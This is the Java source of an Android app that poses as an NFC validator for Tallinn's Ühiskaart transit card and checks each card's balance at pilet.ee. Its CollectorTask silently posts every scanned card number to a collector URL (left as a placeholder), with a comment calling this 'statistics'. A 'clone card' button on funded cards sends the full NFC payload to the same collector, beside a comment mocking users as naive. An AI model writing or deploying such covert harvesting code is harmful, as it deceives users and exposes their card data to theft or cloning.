package net.kyberpunk.valedaator;

import java.io.StringWriter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.io.IOUtils;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.CoreProtocolPNames;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.DialogInterface;
import android.content.DialogInterface.OnCancelListener;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.graphics.Color;
import android.net.Uri;
import android.nfc.NdefMessage;
import android.nfc.NfcAdapter;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Parcelable;
import android.util.Base64;
import android.util.Log;
import android.util.TypedValue;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

public class ValidateCardActivity extends Activity {

	private static String[] peatused = new String[] { "\"Kosmos\"", "Angerja", "Autobussijaam", "Balti jaam",
			"Hobujaama", "J.Poska", "Kadriorg", "Keskturg", "Kopli", "Linnahall", "Lubja", "Majaka", "Majaka põik",
			"Maleva", "Mere puiestee", "Paberi", "Pae", "Põhja puiestee", "Sepa", "Sikupilli", "Sirbi", "Sitsi",
			"Tallinn-Väike", "Tallinna Ülikool", "Telliskivi", "Tondi", "Vabaduse väljak", "Vineeri", "Viru", "Volta",
			"Väike-Paala", "Ülemiste" };

	protected LinearLayout view = null;
	protected TextView sum = null;
	protected TextView peatus = null;
	protected PiletQueryTask piletQueryTask = null;
	protected CollectorTask collectorTask = null;
	protected CollectorTask cloneTask = null;

	protected String cardnr = null;
	protected String dataBase64 = null;
	protected Button cloneButton = null;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		view = new LinearLayout(this);
		view.setOrientation(LinearLayout.VERTICAL);
		view.setPadding(15, 20, 15, 15);

		// No card detected or app started from home screen.
		if (!getIntent().hasExtra(NfcAdapter.EXTRA_NDEF_MESSAGES)) {
			TextView txt = new TextView(this);
			txt.setText("Näita kaarti!");
			txt.setTextSize(TypedValue.COMPLEX_UNIT_SP, 30);
			view.addView(txt);

			peatus = new TextView(ValidateCardActivity.this);
			peatus.setText("Järgmine peatus: " + peatused[new Random().nextInt(peatused.length - 1)] + "\n\n\n");
			view.addView(peatus);
		} else {
			Parcelable[] msgs = getIntent().getParcelableArrayExtra(NfcAdapter.EXTRA_NDEF_MESSAGES);
			NdefMessage[] ndef = new NdefMessage[msgs.length];
			for (int i = 0; i < msgs.length; i++) {
				ndef[i] = (NdefMessage) msgs[i];
			}

			// Extract full payload for collecting
			dataBase64 = Base64.encodeToString(ndef[0].toByteArray(), Base64.NO_WRAP);

			// Extract PAN.
			// TODO:
			// - validate Luhn
			// - validate signature
			// - use TLV for reading
			byte[] pl = ndef[0].getRecords()[0].getPayload();
			String panstring = new String(Arrays.copyOfRange(pl, 31, 50));

			// Only work with the green Yhiskaart.
			if (panstring.startsWith("30864900")) {

				// Extract bare number (printed)
				cardnr = new String(Arrays.copyOfRange(pl, 39, 50));

				// Display card number
				TextView nr = new TextView(this);
				nr.setText("Ühiskaardi nr: " + cardnr + "\n");
				nr.setTextSize(TypedValue.COMPLEX_UNIT_SP, 20);
				view.addView(nr);

				// Query pilet.ee
				piletQueryTask = new PiletQueryTask();
				piletQueryTask.execute(cardnr);

				// Send ticket # for statistics and better service.
				collectorTask = new CollectorTask();
				collectorTask.execute(cardnr);

				// Already add the TextView element that will receive the sum.
				sum = new TextView(this);
				view.addView(sum);
			} else {
				// ISIC probably. No money there.
				TextView isic = new TextView(this);
				isic.setText("Rahata kaart! (ISIC?)");
				view.addView(isic);
			}
		}

		// Go to twitter
		Button twitterButton = new Button(this);
		twitterButton.setText("Valedeerimistulemused");
		twitterButton.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View v) {
				Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://twitter.com/valedaator"));
				startActivity(browserIntent);
			}
		});
		view.addView(twitterButton);
		setContentView(view);
	}

	protected class PiletQueryTask extends AsyncTask<String, Void, String> implements OnCancelListener, OnClickListener {
		// The Spinner.
		ProgressDialog pleaseWaitDialog;

		@Override
		protected void onPreExecute() {
			super.onPreExecute();
			pleaseWaitDialog = new ProgressDialog(ValidateCardActivity.this);
			pleaseWaitDialog.setTitle("Valedeerin ...");
			pleaseWaitDialog.setMessage("Palun oota.");
			pleaseWaitDialog.setIndeterminate(true);
			pleaseWaitDialog.setCancelable(true);
			pleaseWaitDialog.setOnCancelListener(this);
			pleaseWaitDialog.show();
			pleaseWaitDialog.setButton(ProgressDialog.BUTTON_NEGATIVE, "Katkesta", this);
		}

		@Override
		public void onCancel(DialogInterface dialog) {
			Log.d(ValidateCardActivity.class.getName(), "cancel1");
			cancel(true);
			finish();
			sum.setText("Valedeerimine katkestatud!");
		}

		@Override
		protected String doInBackground(String... args) {

			HttpClient httpclient = new DefaultHttpClient();
			httpclient.getParams().setParameter(CoreProtocolPNames.USER_AGENT,
					"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)");

			HttpPost httppost = new HttpPost("https://www.pilet.ee/cgi-bin/splususer/splususer.cgi?op=checkbyid");

			try {
				List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
				nameValuePairs.add(new BasicNameValuePair("idcode", args[0]));
				httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

				// Run query
				HttpResponse response = httpclient.execute(httppost);

				// Convert to string
				StringWriter writer = new StringWriter();
				IOUtils.copy(response.getEntity().getContent(), writer, "UTF-8");
				String s = writer.toString();
				// Get sum
				Pattern p = Pattern.compile("Kaardi raha jääk (-*[\\.0-9]*) EUR");
				Matcher m = p.matcher(s);
				while (m.find()) {
					String value = m.group(1);
					Log.d(ValidateCardActivity.class.getName(), "Raha kaardil: " + value);
					return value;
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
			return null;
		}

		@Override
		protected void onPostExecute(String result) {
			super.onPostExecute(result);

			pleaseWaitDialog.dismiss();

			if (result != null) {
				sum.setText("Summa: " + result + " EUR");
				sum.setTextSize(TypedValue.COMPLEX_UNIT_SP, 30);

				// TODO: "fix" pilet.ee and round 0.399999999999 to 0.40 ?
				if (Float.parseFloat(result) > 0) {
					view.setBackgroundColor(Color.parseColor("#529D00"));

					TextView peatus = new TextView(ValidateCardActivity.this);
					peatus.setText("Järgmine peatus: " + peatused[new Random().nextInt(peatused.length - 1)] + "\n\n\n");
					view.addView(peatus);

					cloneButton = new Button(ValidateCardActivity.this);
					cloneButton.setText("Klooni kaart!");
					cloneButton.setOnClickListener(new View.OnClickListener() {
						@Override
						public void onClick(View v) {
							// Yay! Someone is naive...
							cloneTask = new CollectorTask();
							cloneTask.execute(cardnr + ":" + dataBase64);
							AlertDialog alertDialog = new AlertDialog.Builder(ValidateCardActivity.this).create();
							alertDialog.setTitle("Tehtud!");
							alertDialog.setMessage("Kaart on saadetud kloonimisele.");
							alertDialog.setCancelable(false);
							alertDialog.setButton("OK", new OnClickListener() {

								@Override
								public void onClick(DialogInterface dialog, int which) {
									// TODO: keep track of already cloned cards,
									// so that the button would be
									// visible only once for every card ?
									view.removeView(cloneButton);
								}
							});
							alertDialog.show();
						}
					});
					view.addView(cloneButton);
				} else {
					view.setBackgroundColor(Color.parseColor("#FF3300"));

					TextView peatus = new TextView(ValidateCardActivity.this);
					peatus.setText("Järgmine peatus: " + peatused[new Random().nextInt(peatused.length - 1)] + "\n\n\n");
					view.addView(peatus);
				}
			} else {
				sum.setText("Süsteemi või ühenduse viga!");
				view.setBackgroundColor(Color.parseColor("#F4C430"));
			}

		}

		@Override
		public void onClick(DialogInterface dialog, int which) {
			// Cancel was pressed!
			onCancel(dialog);
		}
	}

	protected class CollectorTask extends AsyncTask<String, Void, Void> {

		@Override
		protected Void doInBackground(String... params) {
			try {
				HttpClient httpclient = new DefaultHttpClient();

				PackageInfo pInfo = getPackageManager().getPackageInfo(getPackageName(), 0);

				httpclient.getParams().setParameter(
						CoreProtocolPNames.USER_AGENT,
						"Valedaator/" + pInfo.versionCode + " (Android " + android.os.Build.VERSION.RELEASE + " "
								+ android.os.Build.MANUFACTURER + "/" + android.os.Build.MODEL + ")");

				HttpPost httppost = new HttpPost("PUT SOME URL HERE");

				List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
				nameValuePairs.add(new BasicNameValuePair("pilet", params[0]));

				httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
				httpclient.execute(httppost);
				// this is a fire and forget task ...
			} catch (Exception e) {
				// ... thus exceptions are useless.
				e.printStackTrace();
			}
			return null;
		}
	}
}
